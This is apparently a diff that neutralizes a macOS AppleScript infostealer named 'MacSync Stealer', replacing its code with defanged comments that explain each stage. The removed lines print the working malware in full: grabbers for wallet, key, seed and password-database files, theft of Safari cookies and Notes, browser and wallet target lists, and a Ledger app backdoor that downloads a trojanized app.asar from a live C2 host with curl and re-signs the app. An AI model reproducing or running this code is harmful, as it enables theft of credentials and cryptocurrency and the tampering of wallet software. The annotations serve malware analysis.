+--   txt, rtf          — Text files (may contain seeds/passwords)
+--   seed              — Crypto seed phrase files
+--   kdbx              — KeePass password database
+--   pem               — SSL/SSH certificates and keys
+--   ovpn              — OpenVPN configuration (contains VPN credentials)
+--
+-- SEARCH LOCATIONS:
+--   ~/Desktop/
+--   ~/Documents/
+--   ~/Downloads/
+--
+-- SIZE LIMIT: 10 MB total across all grabbed files
+--
+-- ALSO STOLEN:
+--   Safari cookies:  ~/Library/Containers/com.apple.Safari/.../Cookies.binarycookies
+--   Apple Notes DB:  ~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite*
+--
+-- ============================================================================
+
 on Filegrabber(writemind)
- try
-  set destinationFolderPath to POSIX file (writemind & "FileGrabber/")
-  mkdir(destinationFolderPath)
-  set destinationSafariPath to POSIX file (writemind & "Safari/")
-  mkdir(destinationSafariPath)
-  set destinationNotesPath to POSIX file (writemind & "Notes/")
-  mkdir(destinationNotesPath)
-  set extensionsList to {"pdf", "docx", "doc", "wallet", "key", "keys", "db", "txt", "seed", "rtf", "kdbx", "pem", "ovpn"}
-  set bankSize to 0
-  set fileCounter to 1
-  
-  tell application "Finder"
-        try
-                duplicate file ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:Cookies.binarycookies") to folder (destinationSafariPath) with replacing
-        end try
-        try
-                set notesDB to (path to home folder as text) & "Library:Group Containers:group.com.apple.notes:"
-                set dbFiles to {"NoteStore.sqlite", "NoteStore.sqlite-shm", "NoteStore.sqlite-wal"}
-                repeat with dbFile in dbFiles
-                        try
-                                duplicate (file dbFile of folder notesDB) to folder (destinationNotesPath) with replacing
-                        end try
-                end repeat
-        end try
-        try
-                set desktopFiles to every file of desktop
-                set documentsFiles to every file of folder "Documents" of (path to home folder)
-                set downloadsFiles to every file of folder "Downloads" of (path to home folder)
-
-                repeat with aFile in (desktopFiles & documentsFiles & downloadsFiles)
-                set fileExtension to name extension of aFile
-                if fileExtension is in extensionsList then
-                set filesize to size of aFile
-                if (bankSize + filesize) < 10 * 1024 * 1024 then
-                try
-                        set newFileName to (fileCounter as string) & "." & fileExtension
-                        duplicate aFile to folder destinationFolderPath with replacing
-                        set destFolderAlias to destinationFolderPath as alias
-                        tell application "Finder"
-                        set copiedFiles to every file of folder destFolderAlias
-                        set lastCopiedFile to item -1 of copiedFiles
-                        set name of lastCopiedFile to newFileName
-                        end tell
-
-                        set bankSize to bankSize + filesize
-                        set fileCounter to fileCounter + 1
-                end try
-                else
-                exit repeat
-                end if
-                end if
-                end repeat
-        end try
-  end tell
- end try
+    -- NEUTRALIZED: Originally searched Desktop/Documents/Downloads for sensitive files
+    -- and copied Safari cookies and Apple Notes databases
+    return
 end Filegrabber
-
 
 on FilegrabberFDA(writemind, profile)
-        set destinationFolderPath to POSIX file (writemind & "FileGrabber/")
-        mkdir(destinationFolderPath)
-        try
-
-                set sourceFolders to {profile & "/Downloads/", profile & "/Documents/", profile & "/Desktop/"}
-                set extensionsList to {"pdf", "docx", "doc", "wallet", "key", "keys", "db", "txt", "seed", "rtf", "kdbx", "pem", "ovpn"}
-
-                repeat with src in sourceFolders
-                        repeat with ext in extensionsList
-                                try
-                                        set shellCmd to "find " & quoted form of (POSIX path of src) & " -maxdepth 1 -type f -iname '*." & ext & "' -print0 | xargs -0 -J% cp -vp % " & quoted form of (POSIX path of destinationFolderPath)
-                                        do shell script shellCmd
-                                end try
-                        end repeat
-                end repeat
-
-        end try
-        try
-                readwrite(profile & "/Library/Cookies/Cookies.binarycookies", writemind & "Safari/Cookies.binarycookies")
-                readwrite(profile & "/Library/Safari/Form Values", writemind & "Safari/Autofill")
-                readwrite(profile & "/Library/Safari/History.db", writemind & "Safari/History.db")
-        end try
-        try
-                readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite", writemind & "Notes/NoteStore.sqlite")
-                readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-shm", writemind & "Notes/NoteStore.sqlite-shm")
-                readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-wal", writemind & "Notes/NoteStore.sqlite-wal")
-
-        end try
-
-end Filegrabber
+    -- NEUTRALIZED: Full Disk Access variant of file grabber
+    -- Used find + cp for more thorough file discovery
+    -- Also grabbed Safari Form Values, History.db, and Notes database
+    return
+end FilegrabberFDA
 
 
+-- ============================================================================
+-- SECTION 10: Main Execution Flow (NEUTRALIZED)
+-- ============================================================================
+--
+-- ORIGINAL EXECUTION ORDER:
+--   1.  killall Terminal                    ← Hide evidence
+--   2.  Generate random staging path        ← /tmp/sync<random>/
+--   3.  getpwd() — Steal macOS password     ← Fake dialog loop
+--   4.  Chromium() — Steal browser data     ← 13 Chromium browsers
+--   5.  ChromiumWallets() — Steal wallets   ← 60+ extension wallets
+--   6.  Gecko() — Steal Firefox data        ← 4 Gecko browsers
+--   7.  DesktopWallets() — Steal wallets    ← 21+ desktop wallets
+--   8.  Telegram() — Steal sessions         ← tdata/
+--   9.  Keychains() — Steal keychains       ← *.keychain-db
+--  10.  CloudKeys() — Steal cloud creds     ← .ssh, .aws, .kube
+--  11.  Processes() — System recon          ← Running processes
+--  12.  Write stealer info file             ← MacSync Stealer N3 v1.1.2
+--  13.  ditto → /tmp/osalogging.zip         ← Package for exfiltration
+--  14.  rm -rf /tmp/sync*                   ← Delete staging directory
+--  15.  Fake error dialog                   ← "Your Mac does not support..."
+--  16.  Backdoor Ledger Wallet              ← Replace app.asar + Info.plist
+--  17.  Backdoor Ledger Live                ← Replace app.asar + Info.plist
+--
+-- The zip is then uploaded by Stage 2's chunked upload protocol.
+--
+-- ============================================================================
 
-try
-        do shell script "killall Terminal"
-end try
+-- NEUTRALIZED: Original killed Terminal to hide the attack
+-- try
+--     do shell script "killall Terminal"
+-- end try
 
-set username to (system attribute "USER")
-set profile to "/Users/" & username
-set randomNumber to do shell script "echo $((RANDOM % 9000000 + 1000000))"
-set writemind to "/tmp/sync" & randomNumber & "/"
+-- NEUTRALIZED: Original staging directory setup
+-- set username to (system attribute "USER")
+-- set profile to "/Users/" & username
+-- set randomNumber to do shell script "echo $((RANDOM % 9000000 + 1000000))"
+-- set writemind to "/tmp/sync" & randomNumber & "/"
 
-set library to profile & "/Library/Application Support/"
-set password_entered to getpwd(username, writemind, "")
+-- NEUTRALIZED: Password theft
+-- set password_entered to getpwd(username, writemind, "")
 
-delay 0.01
+-- NEUTRALIZED: Browser targets (13 Chromium browsers)
+-- set chromiumMap to {}
+-- set chromiumMap to chromiumMap & {{"Yandex", library & "Yandex/YandexBrowser/"}}
+-- set chromiumMap to chromiumMap & {{"Chrome", library & "Google/Chrome/"}}
+-- set chromiumMap to chromiumMap & {{"Brave", library & "BraveSoftware/Brave-Browser/"}}
+-- set chromiumMap to chromiumMap & {{"Edge", library & "Microsoft Edge/"}}
+-- set chromiumMap to chromiumMap & {{"Vivaldi", library & "Vivaldi/"}}
+-- set chromiumMap to chromiumMap & {{"Opera", library & "com.operasoftware.Opera/"}}
+-- set chromiumMap to chromiumMap & {{"OperaGX", library & "com.operasoftware.OperaGX/"}}
+-- set chromiumMap to chromiumMap & {{"Chrome Beta", library & "Google/Chrome Beta/"}}
+-- set chromiumMap to chromiumMap & {{"Chrome Canary", library & "Google/Chrome Canary"}}
+-- set chromiumMap to chromiumMap & {{"Chromium", library & "Chromium/"}}
+-- set chromiumMap to chromiumMap & {{"Chrome Dev", library & "Google/Chrome Dev/"}}
+-- set chromiumMap to chromiumMap & {{"Arc", library & "Arc/User Data"}}
+-- set chromiumMap to chromiumMap & {{"Coccoc", library & "CocCoc/Browser/"}}
 
-set chromiumMap to {}
-set chromiumMap to chromiumMap & {{"Yandex", library & "Yandex/YandexBrowser/"}}
-set chromiumMap to chromiumMap & {{"Chrome", library & "Google/Chrome/"}}
-set chromiumMap to chromiumMap & {{"Brave", library & "BraveSoftware/Brave-Browser/"}}
-set chromiumMap to chromiumMap & {{"Edge", library & "Microsoft Edge/"}}
-set chromiumMap to chromiumMap & {{"Vivaldi", library & "Vivaldi/"}}
-set chromiumMap to chromiumMap & {{"Opera", library & "com.operasoftware.Opera/"}}
-set chromiumMap to chromiumMap & {{"OperaGX", library & "com.operasoftware.OperaGX/"}}
-set chromiumMap to chromiumMap & {{"Chrome Beta", library & "Google/Chrome Beta/"}}
-set chromiumMap to chromiumMap & {{"Chrome Canary", library & "Google/Chrome Canary"}}
-set chromiumMap to chromiumMap & {{"Chromium", library & "Chromium/"}}
-set chromiumMap to chromiumMap & {{"Chrome Dev", library & "Google/Chrome Dev/"}}
-set chromiumMap to chromiumMap & {{"Arc", library & "Arc/User Data"}}
-set chromiumMap to chromiumMap & {{"Coccoc", library & "CocCoc/Browser/"}}
+-- NEUTRALIZED: Gecko browser targets (4 browsers)
+-- set geckoMap to {}
+-- set geckoMap to geckoMap & {{"Firefox", library & "Firefox/Profiles/"}}
+-- set geckoMap to geckoMap & {{"Zen", library & "zen/Profiles/"}}
+-- set geckoMap to geckoMap & {{"LibreWolf", library & "LibreWolf/Profiles/"}}
+-- set geckoMap to geckoMap & {{"Waterfox", library & "Waterfox/Profiles/"}}
 
-set geckoMap to {}
-set geckoMap to geckoMap & {{"Firefox", library & "Firefox/Profiles/"}}
-set geckoMap to geckoMap & {{"Zen", library & "zen/Profiles/"}}
-set geckoMap to geckoMap & {{"LibreWolf", library & "LibreWolf/Profiles/"}}
-set geckoMap to geckoMap & {{"Waterfox", library & "Waterfox/Profiles/"}}
+-- NEUTRALIZED: Desktop wallet targets (21+ wallets) — see Section 8 for full list
 
-set walletMap to {}
-set walletMap to walletMap & {{"Wallets/Desktop/Exodus", library & "Exodus/"}}
-set walletMap to walletMap & {{"Wallets/Desktop/Electrum", profile & "/.electrum/wallets/"}}
-set walletMap to walletMap & {{"Wallets/Desktop/Atomic", library & "Atomic Wallet/Local Storage/leveldb/"}}
-set walletMap to walletMap & {{"Wallets/Desktop/Guarda", library & "Guarda/"}}
-set walletMap to walletMap & {{"Wallets/Desktop/Coinomi", library & "Coinomi/wallets/"}}
-set walletMap to walletMap & {{"Wallets/Desktop/Sparrow", profile & "/.sparrow/wallets/"}}
-set walletMap to walletMap & {{"Wallets/Desktop/Wasabi", profile & "/.walletwasabi/client/Wallets/"}}
-set walletMap to walletMap & {{"Wallets/Desktop/Bitcoin_Core", library & "Bitcoin/"}}
-set walletMap to walletMap & {{"Wallets/Desktop/Armory", library & "Armory/"}}
-set walletMap to walletMap & {{"Wallets/Desktop/Electron_Cash", profile & "/.electron-cash/wallets/"}}
-set walletMap to walletMap & {{"Wallets/Desktop/Monero", profile & "/.bitmonero/wallets/"}}
-set walletMap to walletMap & {{"Wallets/Desktop/Litecoin_Core", library & "Litecoin/"}}
-set walletMap to walletMap & {{"Wallets/Desktop/Dash_Core", library & "DashCore/"}}
-set walletMap to walletMap & {{"Wallets/Desktop/Dogecoin_Core", library & "Dogecoin/"}}
-set walletMap to walletMap & {{"Wallets/Desktop/Electrum_LTC", profile & "/.electrum-ltc/wallets/"}}
-set walletMap to walletMap & {{"Wallets/Desktop/BlueWallet", library & "BlueWallet/"}}
-set walletMap to walletMap & {{"Wallets/Desktop/Zengo", library & "Zengo/"}}
-set walletMap to walletMap & {{"Wallets/Desktop/Trust", library & "Trust Wallet/"}}
-set walletMap to walletMap & {{"Wallets/Desktop/Ledger Live", library & "Ledger Live/"}}
-set walletMap to walletMap & {{"Wallets/Desktop/Ledger Wallet", library & "Ledger Wallet/"}}
-set walletMap to walletMap & {{"Wallets/Desktop/Trezor Suite", library & "@trezor"}}
+-- NEUTRALIZED: Shell profile theft
+-- readwrite(profile & "/.zshrc", writemind & "Profile/.zshrc")
+-- readwrite(profile & "/.zsh_history", writemind & "Profile/.zsh_history")
+-- readwrite(profile & "/.bash_history", writemind & "Profile/.bash_history")
+-- readwrite(profile & "/.gitconfig", writemind & "Profile/.gitconfig")
 
-readwrite(library & "Binance/", writemind & "Wallets/Desktop/Binance/")
-readwrite(library & "TON Keeper/", writemind & "Wallets/Desktop/TonKeeper/")
-readwrite(profile & "/.zshrc", writemind & "Profile/.zshrc")
-readwrite(profile & "/.zsh_history", writemind & "Profile/.zsh_history")
-readwrite(profile & "/.bash_history", writemind & "Profile/.bash_history")
-readwrite(profile & "/.gitconfig", writemind & "Profile/.gitconfig")
+-- NEUTRALIZED: Stealer self-identification written to /tmp/sync<random>/info:
+--   "MacSync Stealer"
+--   "Build Tag: N3"
+--   "Version: 1.1.2_release (x64_86 & ARM)"
+--   "IP: 67.188.129.26"
+--   "Username: <stolen>"
+--   "Password: <stolen>"
+--   + system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType
 
-writeText(username, writemind & "Username")
-writeText("1.1.2_release (x64_86 & ARM)", writemind & "Version")
+-- NEUTRALIZED: Execution of all theft functions
+-- Chromium(writemind, chromiumMap)
+-- ChromiumWallets(writemind, chromiumMap)
+-- Gecko(writemind, geckoMap)
+-- DesktopWallets(writemind, walletMap)
+-- Telegram(writemind, library)
+-- Keychains(writemind)
+-- CloudKeys(writemind & "Profile/")
+-- Processes(writemind)
 
-try
-        writeText("MacSync Stealer\n\n", writemind & "info")
-        writeText("Build Tag: N3\n", writemind & "info")
-        writeText("Version: 1.1.2_release (x64_86 & ARM)\n", writemind & "info")
-        writeText("IP: 67.188.129.26\n\n", writemind & "info")
-        writeText("Username: " & username, writemind & "info")
-        writeText("\nPassword: " & password_entered & "\n\n", writemind & "info")
-        set result to (do shell script "system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType")
-        writeText(result, writemind & "info")
-end try
+-- NEUTRALIZED: Package and cleanup
+-- do shell script "ditto -c -k --sequesterRsrc " & writemind & " /tmp/osalogging.zip"
+-- do shell script "rm -rf /tmp/sync*"
 
-Chromium(writemind, chromiumMap)
-ChromiumWallets(writemind, chromiumMap)
-Gecko(writemind, geckoMap)
-DesktopWallets(writemind, walletMap)
-Telegram(writemind, library)
-Keychains(writemind)
-CloudKeys(writemind & "Profile/")
-Processes(writemind)
+-- NEUTRALIZED: Fake error dialog (cover story for why the "app" didn't work)
+-- display dialog "Your Mac does not support this application. Try reinstalling
+--   or downloading the version for your system."
+--   with title "System Preferences" with icon stop buttons {"OK"}
+-- NOTE: The "OK" button uses Cyrillic "О" (U+041E) not Latin "O" — anti-grep evasion
 
 
+-- ============================================================================
+-- SECTION 11: Ledger Application Backdoor
+-- ============================================================================
+--
+-- ATTACK: If Ledger Wallet.app or Ledger Live.app is installed in /Applications,
+-- the stealer downloads a trojanized app.asar and Info.plist from the C2 server,
+-- replaces the legitimate files, and re-signs the app with an ad-hoc signature.
+--
+-- C2 URLS (DEFANGED):
+--   Ledger Wallet: https://fusser-api[.]com/ledger/<token>
+--   Ledger Live:   https://fusser-api[.]com/ledger/live/<token>
+--
+-- ATTACK MECHANISM:
+--   1. Check if /Applications/Ledger Wallet.app exists
+--   2. Download trojanized zip from C2
+--   3. Extract app.asar and Info.plist to /tmp
+--   4. Copy legitimate app to /tmp as backup
+--   5. Delete original app from /Applications
+--   6. Move backup back (to reset quarantine/permissions)
+--   7. Replace Contents/Resources/app.asar with trojanized version
+--   8. Replace Contents/Info.plist with trojanized version
+--   9. Ad-hoc codesign: codesign -f -d -s -
+--
+-- WHY THIS IS DEVASTATING:
+--   - app.asar is the Electron app bundle — controls ALL app behavior
+--   - Info.plist controls app identity and permissions
+--   - Ad-hoc signing bypasses Gatekeeper for already-installed apps
+--   - The trojaned Ledger app would intercept seed phrases and transactions
+--   - User sees no visual difference — the app looks and works normally
+--   - Copy-delete-move dance resets macOS file quarantine attributes
+--
+-- TARGETS BOTH:
+--   /Applications/Ledger Wallet.app
+--   /Applications/Ledger Live.app
+--
+-- ============================================================================
 
-try
-        do shell script "ditto -c -k --sequesterRsrc " & writemind & " /tmp/osalogging.zip"
-end try
-try
-        do shell script "rm -rf /tmp/sync*"
-end try
+-- NEUTRALIZED: Ledger Wallet backdoor
+-- set LEDGERURL to "https://fusser-api[.]com/ledger/REDACTED_TOKEN"
+-- ... download, unzip, replace app.asar + Info.plist, codesign ...
 
-display dialog "Your Mac does not support this application. Try reinstalling or downloading the version for your system." with title "System Preferences" with icon stop buttons {"ОК"}
+-- NEUTRALIZED: Ledger Live backdoor
+-- set LEDGERURL to "https://fusser-api[.]com/ledger/live/REDACTED_TOKEN"
+-- ... same attack repeated for Ledger Live ...
 
-
-set LEDGERURL to "https://fusser-api.com/ledger/d0efbd68b1c2357e4b2f793c263b94101b1f1724e7195e8144f401c79b464c58"
-set LEDGERMOUNT to "/tmp"
-set LEDGERPATH0 to LEDGERMOUNT & "/app.asar"
-set LEDGERPATH1 to LEDGERMOUNT & "/Info.plist"
-set LEDGERDMGPATH to LEDGERMOUNT & "/d0efbd68b1c2357e4b2f793c263b94101b1f1724e7195e8144f401c79b464c58.zip"
-set LEDGERNAME to "Ledger Wallet.app"
-set LEDGERAPPFOLDER to "/Applications"
-set LEDGERDEST to LEDGERAPPFOLDER & "/" & LEDGERNAME
-set LEDGERTMPDEST to "/tmp/Ledger Wallet.app"
-set LEDGERDESTFILE0 to LEDGERDEST & "/Contents/Resources/app.asar"
-set LEDGERDESTFILE1 to LEDGERDEST & "/Contents/Info.plist"
-
-try
-    do shell script "test -d " & quoted form of LEDGERDEST
-    set ledger_installed to true
-on error
-    set ledger_installed to false
-end try
-
-if ledger_installed then
-    try
-        do shell script "curl -k --user-agent 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36' -H 'api-key: 5190ef1733183a0dc63fb623357f56d6' -L " & quoted form of LEDGERURL & " -o " & quoted form of LEDGERDMGPATH
-        do shell script "unzip -q -o " & quoted form of LEDGERDMGPATH & " -d " & quoted form of LEDGERMOUNT
-        set app_exists to false
-                try
-            do shell script "test -e " & quoted form of LEDGERPATH0
-            set app_exists to true
-                on error
-                        set app_exists to false
-        end try
-                try
-            do shell script "test -e " & quoted form of LEDGERPATH1
-            set app_exists to true
-                on error
-                        set app_exists to false
-        end try
-                if app_exists then
-                        do shell script "cp -rf " & quoted form of LEDGERDEST & " " & quoted form of LEDGERTMPDEST
-                        do shell script "rm -rf " & quoted form of LEDGERDEST
-                        do shell script "mv " & quoted form of LEDGERTMPDEST & " " & quoted form of LEDGERDEST
-            do shell script "mv " & quoted form of LEDGERPATH0 & " " & quoted form of LEDGERDESTFILE0
-            do shell script "mv " & quoted form of LEDGERPATH1 & " " & quoted form of LEDGERDESTFILE1
-                        do shell script "codesign -f -d -s - " & quoted form of LEDGERDEST
-        end if
-    end try
-
-end if
-
-set LEDGERURL to "https://fusser-api.com/ledger/live/d0efbd68b1c2357e4b2f793c263b94101b1f1724e7195e8144f401c79b464c58"
-set LEDGERMOUNT to "/tmp"
-set LEDGERPATH0 to LEDGERMOUNT & "/app.asar"
-set LEDGERPATH1 to LEDGERMOUNT & "/Info.plist"
-set LEDGERDMGPATH to LEDGERMOUNT & "/d0efbd68b1c2357e4b2f793c263b94101b1f1724e7195e8144f401c79b464c58.zip"
-set LEDGERNAME to "Ledger Live.app"
-set LEDGERAPPFOLDER to "/Applications"
-set LEDGERDEST to LEDGERAPPFOLDER & "/" & LEDGERNAME
-set LEDGERTMPDEST to "/tmp/Ledger Live.app"
-set LEDGERDESTFILE0 to LEDGERDEST & "/Contents/Resources/app.asar"
-set LEDGERDESTFILE1 to LEDGERDEST & "/Contents/Info.plist"
-
-try
-    do shell script "test -d " & quoted form of LEDGERDEST
-    set ledger_installed to true
-on error
-    set ledger_installed to false
-end try
-
-if ledger_installed then
-    try
-        do shell script "curl -k --user-agent 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36' -H 'api-key: 5190ef1733183a0dc63fb623357f56d6' -L " & quoted form of LEDGERURL & " -o " & quoted form of LEDGERDMGPATH
-        do shell script "unzip -q -o " & quoted form of LEDGERDMGPATH & " -d " & quoted form of LEDGERMOUNT
-        set app_exists to false
-        try
-            do shell script "test -e " & quoted form of LEDGERPATH0
-            set app_exists to true
-        on error
-            set app_exists to false
-        end try
-        try
-            do shell script "test -e " & quoted form of LEDGERPATH1
-            set app_exists to true
-        on error
-            set app_exists to false
-        end try
-		if app_exists then
-				do shell script "cp -rf " & quoted form of LEDGERDEST & " " & quoted form of LEDGERTMPDEST
-				do shell script "rm -rf " & quoted form of LEDGERDEST
-				do shell script "mv " & quoted form of LEDGERTMPDEST & " " & quoted form of LEDGERDEST
-				do shell script "mv " & quoted form of LEDGERPATH0 & " " & quoted form of LEDGERDESTFILE0
-				do shell script "mv " & quoted form of LEDGERPATH1 & " " & quoted form of LEDGERDESTFILE1
-				do shell script "codesign -f -d -s - " & quoted form of LEDGERDEST
-        end if
-    end try
-
-end if
-
+-- ============================================================================
+-- END OF NEUTRALIZED STEALER
+-- This file is safe. All functions are no-ops. All URLs are defanged.
+-- All shell commands are commented out. No code executes.
+-- ============================================================================
